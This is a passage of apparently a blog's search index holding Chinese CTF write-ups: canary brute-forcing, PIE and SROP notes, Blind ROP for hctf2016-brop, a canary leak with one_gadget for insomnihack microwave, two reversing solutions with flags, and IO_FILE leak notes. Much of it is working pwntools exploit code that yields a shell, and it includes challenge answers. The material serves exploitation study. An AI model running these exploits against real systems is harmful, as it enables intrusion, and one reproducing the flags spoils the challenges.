gs:14h)来比较，所以当我们用栈溢出的时候，我们可以只溢出一个字节来修改[ebp+var_C]的第1个字节，(第0个字节是\\x00)，然后启动检查机制。由于只修改了栈上[ebp+var_C]的第1个字节数据，第3,2个字节仍然还是之前被保存的canary的值。所以我们获取第1个字节需要尝试最少1次，最多2^8次，平均(1/2)*(2^8)次，也就是128次，可以接受。之后将爆破成功的第1个字节加到栈溢出内容中，再溢出一个字节修改[ebp+var_C]上的第2个字节，同理，完成爆破需要128次，总的来说平均需要128*3=384次，完全可以接受。\n\n(3)爆破一般形式程序，两个循环：\n\n```\n#注释头\n\nfor i in xrange(3):\nfor j in xrange(256):\n```\n\n6.之后不同程序不太一样，有的程序没有循环，是直接fork一个子进程，监听其它端口，这时候只要连接该端口就可以进行爆破，失败了关闭端口就是。\n\n有的程序只是在程序中fork一个子进程，但是有循环，那么我们就需要在循环里跑出来canary。然后直接进行下一步payload，不然断开连接的话，程序又重新生成canary，等于没用。\n\n7.总结一下，程序最开始需要输入Y，然后跳转到有漏洞的函数sub_80487FA中，之后可以获取输入name，这里的输入的name在下一条[*] Welcome to the game之后会被打印出来，并且打印的方式存在格式化字符串漏洞。所以可以通过调试，输入%p来获取栈上的指定的libc地址内容，泄露libc从而获取libc基地址。\n\n8.由于每次子程序崩溃后都会从头开始，都需要再输入Y和name，那么直接将该段泄露代码放在爆破循环中即可：\n\n```\ncanary = '\\x00'\nfor i in xrange(3):\n    for j in xrange(256):\n        io.sendline('Y')\n        io.recv()\n        io.sendline('%19$p') #泄露栈上的libc地址\n        io.recvuntil('game ')\n        leak_libc_addr = int(io.recv(10), 16)\n\n        io.recv()\n        payload = 'A'*16 #构造payload爆破canary\n        payload += canary\n        payload += chr(j)\n        io.send(payload)\n        io.recv()\n        if (\"\" != io.recv(timeout = 0.1)): \n        #如果canary的字节位爆破正确，应该输出两个\"[*] Do you love me?\"，因此通过第二个recv的结果判断是否成功\n            canary += chr(j)\n            log.info('At round %d find canary byte %#x' %(i, j))\n            break\n```\n\n \n\n9.爆破结束后，得到libc基地址，canary，以及一个可以利用的栈溢出，程序循环从最开始。那么利用栈溢出返回到system函数，由于32位程序，栈传参，那么可以提前布置好栈，使得system函数直接从我们布置的栈上读取binsh字符串，直接getshell。\n\n```\n#注释头\n\nlog.info('Canary is %#x' %(u32(canary)))\nsystem_addr = leak_libc_addr - 0x2ed3b + 0x3b060\nbinsh_addr = leak_libc_addr - 0x2ed3b + 0x15fa0f\nlog.info('System_address:%#x,binsh_addr:%#x'%(system_addr,binsh_addr))\n\npayload = ''\npayload += 'A'*16\npayload += canary\npayload += 'B'*12\npayload += p32(system_addr)\npayload += 'CCCC'\npayload += p32(binsh_addr)\n\nio.sendline('Y') #[*] Do you love me?\nio.recv()\nio.sendline('1') #[*] Input Your name please: 随便一个输入\nio.recv()\nio.send(payload) #[*] Input Your Id: 漏洞产生点\nio.interactive()\n```\n\n \n\n参考资料：\n\nhttps://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157\n\n","tags":["canary"],"categories":["PWN","canary绕过0x9"]},{"title":"PIE绕过总结","url":"/2021/08/19/PIE绕过总结/","content":"\n1.利用PIE机制，爆破倒数第四位可以跳转到同一个内存页中的任意函数。\n\n2.利用栈溢出和打印函数的参数，修改劫持rbp使得利用rbp寻址的打印函数的参数指向栈上其它位置，通过爆破来寻求泄露Libc地址。\n\n3.利用vsyscall或者vdso来滑过一段栈空间，从而将eip挪移到栈底下方我们想要的地址处。\n\n","tags":["PIE"],"categories":["PWN","PIE0x7"]},{"title":"SROP总结","url":"/2021/08/19/SROP总结/","content":"\n一、SROP调用的结构体，在sigcontext.h中有定义：\n\n1.32位程序：\n\n(1)总长度共计：\n\n(2)调用：\n\n```\n#注释头\n\nA.32位系统上运行32位程序：\ncontext.arch = 'i386'\nSigreturnFrame(kernel = 'i386')\n\nB.64位系统上运行32位程序：\ncontext.arch = 'i386'\nSigreturnFrame(kernel = 'amd64')\n```\n\n2.64位程序：\n\n(1)总长共计：0xf8\n\n(2)调用：\n\n```\n#注释头\n\ncontext.arch = ‘amd64’\nSigreturnFrame(kernel = ‘amd64’)\n```\n\n \n\n二、pwn中使用：\n\n1.首先定义：\n\nframe_func = SigreturnFrame()\n\n2.之后设置寄存器：\n\n```\n#注释头\n\nframe_func.rax = constants.SYS_func\nframe_func.rdi/rsi/......\nframe_func.rsp = stack_addr\n#栈劫持一般可以用到，即当SROP运行完之后，栈顶就会跳转到设置的rsp处，没设置则默认为0\nframe_func.rip = syscall_addr\n#这里通过rax和rip配合调用任意系统函数，其它寄存器就是用来设置参数的)\n```\n\n3.使用条件：\n\n(1)没有sigreturn gadget指针时，利用syscall来调用：\n\n①64位需要系统调用号rax = 0xf。32位需要系统调用号rax = 0x4d\n\n(这个一般可以通过read函数来实现，修改rax)\n\n②进入时需要执行syscall，栈顶rsp指向frame_func结构体头部。\n\n(2)有sigreturn指针时：\n\n直接覆盖返回地址为sigreturn gadget，然后该返回地址下方的栈上覆盖frame_func结构体。\n\n \n\n三、常用功能：\n\n1.read：\n\n```\n#注释头\n\nframe_read = SigreturnFrame() #设置read的SROP帧\nframe_read.rax = constants.SYS_read\nframe_read.rdi = 0\nframe_read.rsi = stack_addr\nframe_read.rdx = 0x300\nframe_read.rip = syscall_addr\n```\n\n2.利用mprotect修改内存RWX权限：\n\n```\n#注释头\n\nframe_mprotect = SigreturnFrame()\n#设置mprotect的SROP帧，用mprotect修改栈内存为RWX\nframe_mprotect.rax = constants.SYS_mprotect\nframe_mprotect.rdi = stack_addr & 0xFFFFFFFFFFFFF000\nframe_mprotect.rsi = 0x1000\nframe_mprotect.rdx = constants.PROT_READ | constants.PROT_WRITE | constants.PROT_EXEC\nframe_mprotect.rsp = stack_addr\nframe_mprotect.rip = syscall_addr\n```\n\n3.getshell:\n\n```\n#注释头\n\nframe_execve = SigreturnFrame()\nframe_execve.rax = constants.SYS_execve\nframe_execve.rdi = stack_addr+0x108\n#这是binsh字符串的地址\nframe_execve.rip = syscall_addr\n```\n\n \n\n四、结构体 in /usr/include/bits/sigcontext.h：\n\n```\n#注释头  0xf8\n\nstruct sigcontext\n{\n__uint64_t r8;\n__uint64_t r9;\n__uint64_t r10;\n__uint64_t r11;\n__uint64_t r12;\n__uint64_t r13;\n__uint64_t r14;\n__uint64_t r15;\n__uint64_t rdi;\n__uint64_t rsi;\n__uint64_t rbp;\n__uint64_t rbx;\n__uint64_t rdx;\n__uint64_t rax;\n__uint64_t rcx;\n__uint64_t rsp;\n__uint64_t rip;\n__uint64_t eflags;\nunsigned short cs;\nunsigned short gs;\nunsigned short fs;\nunsigned short __pad0;\n__uint64_t err;\n__uint64_t trapno;\n__uint64_t oldmask;\n__uint64_t cr2;\n__extension__ union\n{\nstruct _fpstate * fpstate;\n__uint64_t __fpstate_word;\n};\n__uint64_t __reserved1 [8];\n};\n```\n\n \n\n```\n#注释头    0x50\n\nstruct sigcontext\n{\nunsigned short gs, __gsh;\nunsigned short fs, __fsh;\nunsigned short es, __esh;\nunsigned short ds, __dsh;\nunsigned long edi;\nunsigned long esi;\nunsigned long ebp;\nunsigned long esp;\nunsigned long ebx;\nunsigned long edx;\nunsigned long ecx;\nunsigned long eax;\nunsigned long trapno;\nunsigned long err;\nunsigned long eip;\nunsigned short cs, __csh;\nunsigned long eflags;\nunsigned long esp_at_signal;\nunsigned short ss, __ssh;\nstruct _fpstate * fpstate;\nunsigned long oldmask;\nunsigned long cr2;\n};\n```\n\n实际大小最好对应版本再调试\n","tags":["SROP"],"categories":["PWN","SROP0x8"]},{"title":"X-CTF-maze","url":"/2021/08/19/X-CTF-maze/","content":"\n文件地址：https://github.com/PIG-007/X-CTF\n\n 1.拖入exeinfope.exe查看版本位数，64位，载入IDA.\n\n2.由于题目maze的提示，还有函数中一直出现的8，再加上判断语句中\n\nasc_601060[8 * (signed int)v9 + SHIDWORD(v9)] != '#'\n\n以及字符串：\n\n“  *******  *  **** * ****  * ***  *#  *** *** ***   *********”\n\n可知是走迷宫题目，也就是将该字符串以8位为一个行，形成一个8*8的迷宫：\n\n![https://adworld.xctf.org.cn/media/task/writeup/cn/maze/10.png](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191557487.png)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191557287.jpeg)\n\n按照1的路径一直走，共走18步。\n\n3.然后再仔细分析，在linux中运行，需要输入flag，再在IDA中发现有输入长度要求，得是nctf{xxxxx(18个)}这种形式。然后分析迷宫，发现取最短路径走到#刚好是18个。\n\n4.现在开始寻找方向：很容易发现四个if语句：（这里得右键对应的数字-R转成字符形式，才能看到对应数字的ascii码）\n\nif ( v4 == 'O' )\n\nif ( v4 == 'o' )\n\nif ( v4 == '.' )\n\nif ( v4 == '0' )\n\n这个应该就是代表上下左右了，那么现在还得判断究竟是哪个代表哪个。这里有两种方法。一是接着看代码，进去里面仔细分析，可以推出。二是通过远程调试来判断。\n\n▲方法一：我们进入到四个if语句中的每个函数中看看，有类似如下语句：\n\nv1 = (*a1)--;\n\nv1 = *a1 + 1;\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191557346.jpeg)![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191557285.jpeg)\n\n传入的值分别是：&v10+4,和&v10，这里不同的IDA反汇编出来的参数不一样，但看v10的类型是一个int型的指针，4个字节为一个int，&v10+4代表int指针往下拨动一个int，也就是常说的指针+1，有的时候IDA也会反汇编为&v10+1，这是代表的是&(V10+1)也是一样的，只是括号没有写出来。这里我们可以将鼠标移动到变量上，按下Y快捷键，输入int[2]来修改，之后再按N快捷键修改变量名称为direction，最终变成\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191557350.jpeg)\n\n这样就清晰多了，至于为什么要int[2]，因为迷宫都是二维的，一般可用x0y坐标轴来表示，这样我们就可将direction[1]l来代表x轴，direction代表y轴，反之亦然。如下：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191557351.jpeg)\n\n那么就是O和o代表x轴左右，0和.代表y轴上下或者反过来，则flag就有两种，都列举出来提交试试就可以得到正确答案。\n\n▲尝试第二种方法，远程linux下调试：这里还需要看看接下来的代码：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191557829.jpeg)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191557885.jpeg)\n\n所有方向判断语句之后都会跳转到LABEL_14，由此可以断定得是判断正确才会break来使得label20不被运行，从而跳出打印错误flag的语句，所以这里需要使得v6=1，然后再向上找找，有这样的语句：\n\n而v7又是方向判断函数的返回值，所以在运行时可以尝试看v7的值来判断输入的正确与否。于是在该处下断点，或者对应汇编代码中：mov bpl, al。(鼠标放在v7上，显示al，说明v7是存放在al这个变量上的)，尝试性输入nctf{000000000000000000}，输入够了就行，然后在运行中看v7，也就是al的值，如果被赋值为1，则0就代表向右，因为我们迷宫中第一步就是向右的，否则就换下一个试。依次类推，可以通过调试来摸清方向。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191557962.jpeg)\n\n断点停住，查看al的值为1，本来应该说明0代表向右，但是如果输入\n\nnctf{oooooooooooooooooo}，al的值也是1。这里是因为右和下都能走，但是源代码中还有一个判断逻辑：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191557966.jpeg)\n\n代表撞墙逻辑，也就是如果撞墙上了，仍然会打印错误Flag。查看迷宫，发现向下会撞墙上，而对应nctf{oooooooooooooooooo}调试的时候，接着单步执行，会发现程序再一次进入方向判断函数，并没有直接进入撞墙的逻辑中，说明nctf{oooooooooooooooooo}的第一个才是右，而nctf{000000000000000000}会撞墙上，虽然v7的值是1，但仍然会导致错误。所以0代表下，o代表右，依次类推就可以判断出方向。\n\n最终flag为：nctf{o0oo00O000oooo..OO}\n\n(Linux远程调试可以看其它文章)\n\n \n\n \n\n \n","tags":["First"],"categories":["REVERSE"]},{"title":"X-CTF-no_string","url":"/2021/08/19/X-CTF-no_string/","content":"\n文件地址：https://github.com/PIG-007/X-CTF\n\n1.  这是一个linux程序，先在Linux环境下跑一下，输出两串没用字符，其中一个是显示错误信息，不过这也代表了应该要输入东西之后，显示正确，然后打印flag，或者直接输入flag，打印正确。\n2. 载入IDA，发现关键函数在authenticate()中的decrypt()，函数decrypt()进行一堆算法，然后赋值给s2，再将s2与输入的字符串作比较，一样就打印成功，但是不打印其它字符串。这里就可以判定我们应该是得输入flag，然后程序判断后打印成功。那么我们需要的flag就应该在s2中。这里就可以分两种方法来获取flag。\n\n★第一种：让程序跑起来，然后查看s2所在寄存器的的值\n\n(1)打开linux的虚拟环境，打开终端，输入gdb no_string，开始使用gdb载入程序。\n\n(2)输入命令b decrypt，表示在该函数处下断点，之后输入r让程序运行至断点处停止。\n\n(3)这时候因为程序是停在decrypt这个函数上，并没有执行该函数，所以应该输入n来使得程序进行一步，运行该函数。\n\n(4)此时eax寄存器中应该保存着s2，也就是我们需要的flag的值，所以输入命令：x/200wx$eax 来获取eax寄存器中的值：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191557048.jpeg)\n\n从0x00000039一直到字符串结尾字符标志0x00000000，也就是对应flag的值，大家直接黏贴出来转ascii码就行。\n\n▲200是代表查看多少个，wx是代表以word字节查看，$eax即是查看该寄存器的值。\n\n(另外：可以通过IDApython来打印，也就是先在linux下远程动态调试，将断点停在decrypt上，然后运行一步，在右上角寄存器窗口栏右键eax-在数据窗口跟随，找到eax的首地址，运行如下py代码：\n\n```\n#注释头\naddr=0x0965D800#eax首地址，或者点击eax首地址，然后换成here()\nans=\"\"\nfor temp addr in range(addr,addr+50*4,4):\n    ans+=get_bytes(tempaddr,1)\nprint(ans)\n```\n\n \n\n这里addr+50*4代表从addr开始偏移量为50*4，因为可以看到eax中每四个字节存 储一个字符数据，也就是向下读取50个字符，然后后面的4是以4个字节为一个单位来翻译字符)\n\n★第二种：\n\n(1)在IDA中查看传入decrypt的两个数据，可以用Py脚本打印或者是点进去，然后选中整个数据段之后shift+E，可以转换为C类型或者是hex类型可得。\n\n(2)然后编写逆推算法：利用十六进制来表示。\n","tags":["First"],"categories":["REVERSE"]},{"title":"hctf2016-brop","url":"/2021/08/19/hctf2016-brop/","content":"\n1.题目用以下代码编译和搭建，[brop.c]就是程序代码文件\n\n```\n#注释头\n\ngcc -z noexecstack -fno-stack-protector -no-pie brop.c -o brop\nsocat tcp-listen:10001,fork exec:./brop,reuseaddr &\n```\n\n2.程序不打印我们的输入，并且输入多个%p没什么反应，那么应该就不是格式化字符串盲打，尝试栈溢出行不行，使用脚本爆破一下：\n\n```\n#注释头\n\ndef getbufferflow_length():\n    i = 1\n    while 1:\n        try:\n            sh = remote('127.0.0.1', 10001)\n            sh.recvuntil('WelCome my friend,Do you know password?\\n ')\n            sh.send(i * 'a')\n            output = sh.recv()\n            sh.close()\n            if not output.startswith('No password'):\n                return i - 1\n            else:\n                i += 1\n        except EOFError:\n            sh.close()\n            return i - 1\n\nbuf_size = getbufferflow_length()\nlog.info(\"buf_size:%d\"%buf_size)\n```\n\n不断尝试，如果没有接收到“No password”那就代表程序出错，栈溢出覆盖到了返回地址，这时候就退出，其它错误也退出。最后爆破出来为72个字节，那么buf的缓冲区就是72-8(rbp)=64个字节。(总感觉这里有点问题，如果真是blind，那么肯定也不知道是32位还是64位啊，那么就应该两种方案都要尝试一下吧)\n\n3.寻找可以使得程序挂起的stop_gadget。这个stop_gadget是什么不重要，只要能让程序不崩溃，能够在之后探索其它可以rop的时候接收到正确的反馈，那么是什么都可以。\n\n```\n#注释头\n\ndef get_stop_addr(buf_size):\n    addr = 0x400000\n    while True:\n        sleep(0.1)#缓冲\n        addr += 1\n        payload = \"A\"*buf_size\n        payload += p64(addr)#probe_addr\n        try:\n            sh = remote('127.0.0.1', 10001)\n            sh.recvline()\n            sh.sendline(payload)\n            sh.recvline()\n            sh.close()\n            log.info(\"stop address: 0x%x\" % addr)\n            return addr\n        except EOFError as e:#crash and restart\n            sh.close()\n            log.info(\"bad: 0x%x\" % addr)\n        except:#other error\n            log.info(\"Can't connect\")\n            addr -= 1\n```\n\n4.得到stop_addr之后，就可以继续探索其它的rop_gadget，这里寻找万能gadget的六个pop的地方：\n\n```\n#注释头\n\ndef get_gadgets_addr(buf_size, stop_addr):\n    addr = stop_addr\n    while True:\n        sleep(0.1)\n        addr += 1\n        payload = \"A\"*buf_size\n        payload += p64(addr)\n        payload += p64(1) + p64(2) + p64(3) + p64(4) + p64(5) +\n        p64(6)\n        payload += p64(stop_addr)\n        try:\n            p = remote('127.0.0.1', 10001)\n            p.recvline()\n            p.sendline(payload)\n            p.recvline()\n            p.close()\n            log.info(\"find address: 0x%x\" % addr)\n            try: # check\n                payload = \"A\"*buf_size\n                payload += p64(addr)\n                payload += p64(1) + p64(2) + p64(3) + p64(4) + p\n                64(5) + p64(6)\n                #Six pop without stop_addr\n                p = remote('127.0.0.1', 10001)\n                p.recvline()\n                p.sendline(payload)\n                p.recvline()\n                p.close()\n                log.info(\"bad address: 0x%x\" % addr)\n                #Not crash,Bad addr.\n            except:#Crash,success addr\n                p.close()\n                log.info(\"gadget address: 0x%x\" % addr)\n                return addr\n        except EOFError as e:\n            p.close()\n            log.info(\"bad: 0x%x\" % addr)\n        except:\n            log.info(\"Can't connect\")\n            addr -= 1\n```\n\n找到之后，需要再次检查一下，用来确定是不是万能gadget，因为如果有程序六个pop之后不retn，那就不是万能gadget。因为需要dump二进制文件，所以需要万能gadget中的Pop rdi;ret 这个gadget来dump文件。\n\n5.寻找puts函数的plt表，方便之后调用puts函数和pop rdi;ret这个gadget来dump二进制文件。\n\n```\n#注释头\n\ndef get_puts_addr(buf_size, rdi_ret, stop_gadget):\n    addr = 0x400000\n    while 1:\n        print hex(addr)\n        sh = remote('127.0.0.1', 10001)\n        sh.recvuntil('password?\\n')\n        payload = 'A' * buf_size + p64(rdi_ret) + p64(0x400000) + p64(addr) + p64(stop_gadget)\n        #call put to print the head of ELF.\n        sh.sendline(payload)\n        try:\n            content = sh.recv()\n            if content.startswith('\\x7fELF'):\n                print(\"find puts@plt addr: 0x%x\"%addr)\n                return addr\n            sh.close()\n            addr += 1\n        except EOFError as e:\n            sh.close()\n            log.info(\"bad: 0x%x\" % addr)\n        except:\n            log.info(\"Can't connect\")\n            addr -= 1\n```\n\n这里实际上找出来的地址并不是puts函数的plt表地址，而是在puts的plt表前面一点的内容，但是这一小段内容不影响栈和rdi寄存器，所以没什么影响。\n\n6.利用puts函数和pop rdi;ret来dump二进制文件：\n\n```\n#注释头\n\ndef dump_memory(buf_size, stop_addr, gadgets_addr, puts_plt, start_addr, end_addr):\n    pop_rdi = gadgets_addr + 9 # pop rdi; ret\n    result = \"\"\n    while start_addr < end_addr:\n        #print result.encode('hex')\n        sleep(0.1)\n        payload = \"A\"*buf_size\n        payload += p64(pop_rdi)\n        payload += p64(start_addr)\n        payload += p64(puts_plt)\n        payload += p64(stop_addr)\n        try:\n            sh = remote('127.0.0.1', 10001)\n            sh.recvline()\n            sh.sendline(payload)\n            data = sh.recv(timeout=0.1) \n            #timeout makes sure to recive all bytes\n            if data == \"\\n\":#data = \\x00\n                data = \"\\x00\"\n            elif data[-1] == \"\\n\":\n            #data = xxxxx\\n\\x00,data = \\n\\x00,data = xxxxx\\x00\n                data = data[:-1]\n            log.info(\"leaking: 0x%x --> %s\" % (start_addr,(data or '').encode('hex')))\n            result += data\n            start_addr += len(data)\n            sh.close()\n        except:\n            log.info(\"Can't connect\")\n    return result\n```\n\n由于puts 函数通过 \\x00 进行截断，不会输出\\x00，并且会在每一次输出末尾加上换行符\\x0a ，所以有一些特殊情况需要做一些处理，比如单独的 \\x00 、 \\x0a 等。首先当然是先去掉末尾 puts 自动加上的 \\n ，然后如果 recv 到一个 \\n ，说明内存中是 \\x00 ，如果 recv 到一个 \\n\\n ，说明内存中是\\x0a 。 p.recv(timeout=0.1) 是由于函数本身的设定，如果有 \\n\\n ，它很可能在收到第一个 \\n 时就返回了，加上参数可以让它全部接收完。\n\n7.得到二进制文件后就是常规操作了，利用Dynelf或者LibcSearcher和puts函数找到system函数和binsh实际位置，之后通过pop rdi;ret来为system函数赋参数从而getshell。\n\n```\n#注释头\n\nsh = remote('127.0.0.1', 10001)\nsh.recvuntil('password?\\n')\npayload = 'a' * length + p64(rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(\nstop_gadget)\nsh.sendline(payload)\ndata = sh.recvuntil('\\nWelCome', drop=True)\nputs_addr = u64(data.ljust(8, '\\x00'))\nlibc = LibcSearcher('puts', puts_addr)\nlibc_base = puts_addr - libc.dump('puts')\nsystem_addr = libc_base + libc.dump('system')\nbinsh_addr = libc_base + libc.dump('str_bin_sh')\npayload = 'a' * length + p64(rdi_ret) + p64(binsh_addr) + p64(\nsystem_addr) + p64(stop_gadget)\nsh.sendline(payload)\nsh.interactive()\n```\n\n这里的libcSearcher有时候不太好用，查到的libc不符合，或者是不对。还是DynElf好用一些，比较准确，并且由于是puts函数打印，所以可能需要单个字符来判断。但实际上64位条件下的got表中的地址一定是0x00007fxxxxxxxxxx，所以如果是大端情况，那么puts函数一定会截断，接收到的只会是xxxxxxxxxx7f和0a所以其实只要判断到换行符的时候就可以。\n\n```\n#注释头\n\ndef leak(address):\n    data = \"\"\n    c=\"\"\n    up = \"\"\n    payload = 'a' * length + p64(rdi_ret) + p64(address) + p64(puts_plt) + p64(stop_gadget)\n    sh.recvuntil('password?\\n')\n    sh.send(payload)\n    while True:\n        c = p.recv(1)\n        if up == '\\n' and c == \"W\":  \n            data = data[:-1]                     \n            data += \"\\x00\"\n            break\n        else:\n            data += c\n        up = c\n    data=data[:7]#实际有效地址只有6个字符\n    log.info(\"%#x => %s\" % (address, (data or '').encode('hex')))\n    return data\n\n\ndynelf = DynELF(leak, elf=ELF(\"./brop\"))\nsystem_addr = dynelf.lookup(\"__libc_system\", \"libc\")\n```\n\n但是DynElf好像不能找binsh字符串，所以如果用这种方法那就还需要泄露read的真实地址，找个能写的地方将binsh写进去再调用，比较麻烦。所以能用libcSearcher可以先用来试试，函数，binsh字符串都能找，比较方便一点。\n\n \n\n参考资料：\n\nhttps://wiki.x10sec.org/pwn/linux/stackoverflow/medium-rop-zh/#brop\n\nctf-all-in-one\n\n \n\n \n","tags":["Blind"],"categories":["PWN","BlindROP"]},{"title":"insomnihack CTF 2016-microwave","url":"/2021/08/19/insomnihack CTF 2016-microwave/","content":"\n1.常规checksec，程序全部开启保护，并且有canary保护，从IDA中汇编代码和伪代码也可以看到：\n\n(1)汇编代码：\n\n①生成canary的代码:一般在函数初始化的时候就可以看到\n\n```\n#注释头\n\nmov rax,fs:28h\nmov [rsp+28h+var_20], rax\n```\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191523843.png)\n\n②校验:\n\n```\n#注释头\n\nmov rax, [rsp+28h+var_20]\nxor rax, fs:28h\njnz short func\n```\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191523812.png)\n\n(2)伪代码：\n\n```\n#注释头\n\nv_canary = __readfsqword(0x28u);\nreturn __readfsqword(0x28u) ^ v_canary;\n```\n\n有很多种形式，如下也是一种：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191523399.png)\n\n2.之后查找漏洞，找到两个漏洞：\n\n(1)功能1的sub_F00函数中的printf存在格式化字符串漏洞：\n\n```\n#注释头\n\n__printf_chk(1LL, a1);\n```\n\n这里的1LL不知道是个什么意思，但是实际效果仍然相当于是printf(a1)，调试中可以知道。\n\n(2)功能2的sub_1000存在栈溢出漏洞：\n\n```\n#注释头\n\n__int64 v1; // [rsp+0h] [rbp-418h]\n------------------------------------------------------\nread(0, &v1, 0x800uLL);\n```\n\n3.现在是保护全开，栈溢出漏洞因为canary的关系没办法利用，唯一能利用的只有一个printf()函数，而且还没办法劫持got表，没办法进行完全栈操控。所以这里就想能不能通过printf函数泄露canary从而使得栈溢出这个漏洞派上用场。\n\n4.首先调试，观察canary在栈上的偏移位置，调试断点下在sub_F00函数的printf函数上，因为这个sub_F00函数中也有canary的保护，那么该函数栈上一定存在canary的值。自己调试如下图：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191523613.png)\n\nIDA调试界面点击对应生成canary的代码mov  [rsp+28h+var_20], rax中的[rsp+28h+var_20]就可以知道canary的位置应该是rsp+8h处，这里也可以看出来V6就是canary\n\n另外由于这是64位程序，取参顺序是rdi, rsi, rdx, rcx, r8, r9, 栈，由于printf()前两个参数位rdi,rsi对应的是fd和&buf，\n\n这里的buf就是我们输入的username，因为username的输入保存在堆上main函数中有声明：\n\n```\n#注释头\n\nvoid *v4; // r12\n----------------------------------------------------------------\nv4 = malloc(0x3EuLL);\n-------------------------------------------------------------------\nfwrite(\" username: \", 1uLL, 0x15uLL, stdout);\nfflush(0LL);\nfgets((char *)v4, 40, stdin);\n--------------------------------------------------------------------\nfwrite(\" password: \", 1uLL, 0x15uLL, stdout);\nfflush(0LL);\nv3 = 20LL;\nfgets((char *)v4 + 40, 20, stdin);\n------------------------------------------------------------------------\nsub_F00((__int64)v4);\n--------------------------------------------------------------------\nunsigned __int64 __fastcall sub_F00(__int64 a1)\n-------------------------------------------------------------------\n__printf_chk(1LL, a1);\n```\n\n下图是没有打印之前的内容：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191523728.png)\n\n我们可以看到rsi的值是5开头的，这其实就是一个堆内存地址，调试过程中输入跳转就可以看到该地址对应的内容就是我们的输入username的值。那么输入username时输入多个%p，触发格式化字符串漏洞，打印寄存器和栈上的内容，泄露出libc地址和canary。printf()依次根据%p打印的参数顺序是rdx,rcx,r8,r9,栈。所以r9之后第一个打印出来的数据是rsp-8h，也就是canary的值，这样就可以得到泄露的canary的值，从而控制栈溢出。同时我们可以发现打印出来的数据中包含libc中的函数，这样同时也泄露出来了libc加载后的地址，之后通过偏移计算出基地址。\n\n5.之后进行栈溢出操控，但是这里如果连不上账户会没办法使用sub_1000函数，用IDA查看可以看到在sub_f00函数中对密码进行检查，可直接查看到密码：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191522910.png)\n\n这个off_204010就是密码，点进去就可以看到。\n\n由之前步骤可以得到canary和libc基地址。查询之后可以发现由于retn前会检查canary，对应汇编代码是：\n\nxor rax, fs:28h\n\n那么如果canary输入成功，xor之后会使得rax一定为0，满足该libc库的Onegadget条件，所以这里可以直接使用Onegadget：\n\n```\n#注释头\n\npayload = \"A\"*1032 #padding\npayload += p64(canary) #正确的canary\npayload += \"B\"*8 #padding\npayload += p64(one_gadget_addr) #one gadget RCE\nio.sendline('2') #使用有栈溢出的功能2\nio.recvuntil('#> ')\nio.sendline(payload)\n```\n\n参考资料：\n\nhttps://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157\n","tags":["canary"],"categories":["PWN","canary绕过0x9"]},{"title":"利用IO_FILE泄露地址","url":"/2021/08/19/利用IO_FILE泄露地址/","content":"\nIO_FILE的具体结构和功能在FSOP中写过，这里主要关注下其中的打印函数_IO_2_1_stdout的相关利用，通常用来在堆利用时，由于没有show之类的打印堆块内容的选项，导致无法泄露libc地址的情况。\n\n一、_flags：\n\n这里的_flags在_IO_2_1_stdout结构体中，一旦我们想要通过_IO_2_1_stdout来打印指定内存地址的内容，就需要对_flags的值进行设置，绕过一些检查，才能最终进入_IO_SYSWRITE函数打印。\n\n1._IO_new_file_overflow函数中的检查：\n\n(1)不能进入，判断语句需要为假，否则直接返回EOF了。\n\n```\n#注释头\n\nif (f->_flags & _IO_NO_WRITES)   /* SET ERROR */\n{\n    f->_flags |= _IO_ERR_SEEN;\n    __set_errno (EBADF);\n    return EOF;\n}\n```\n\n需要满足条件：f->_flags & _IO_NO_WRITES == false\n\n(2)不能进入，判断语句需要为假\n\n```\n#注释头\n\nif ((f->_flags & _IO_CURRENTLY_PUTTING) == 0 || f->_IO_write_base == NULL)\n```\n\n因为这里一旦进入，就会有一个初始化指针的操作，导致我们的_IO_write_base被覆盖，从而无法输出想要的地址的内容。\n\n需要满足条件：((f->_flags & _IO_CURRENTLY_PUTTING) == 0 || f->_IO_write_base == NULL) == false\n\n之后就跳到如下语句：\n\n```\n#注释头\n\nif (ch == EOF)\n    return _IO_do_write (f, f->_IO_write_base,f->_IO_write_ptr - f->_IO_write_base);\n```\n\n进入_IO_do_write函数。\n\n2._IO_do_write函数中的检查：\n\n▲由于如下定义：libc_hidden_ver (_IO_new_do_write, _IO_do_write)，该函数成了_IO_new_do_write函数，定义如下：\n\n```\n#注释头\n\n_IO_new_do_write (_IO_FILE *fp, const char *data, _IO_size_t to_do)\n{\n    return (to_do == 0\n        || (_IO_size_t) new_do_write (fp, data, to_do) == to_do) ? 0 : EOF;\n}\n```\n\n这个函数中没什么操作，直接进入到new_do_write函数.\n\n3.new_do_write函数中的检查：\n\n```\n#注释头\n\nif (fp->_flags & _IO_IS_APPENDING)\nelse if (fp->_IO_read_end != fp->_IO_write_base)\n```\n\n这里其实不太明白，很多地方说要满足其中一个才能进入到实际调用打印的系统函数：\n\n```\n#注释头\n\ncount = _IO_SYSWRITE (fp, data, to_do);\n```\n\n但是我认为if和else if都绕过应该也可以运行到count的执行语句，不知道是不是因为需要设置fp->_offset才能打印，那如果是的话，控制_IO_2_1_stdout的结构体不也能设置fp->_offset的值吗。\n\n(1)针对if (fp->_flags & _IO_IS_APPENDING)：这个可以进入，影响不大\n\n```\n#注释头\n\nif (fp->_flags & 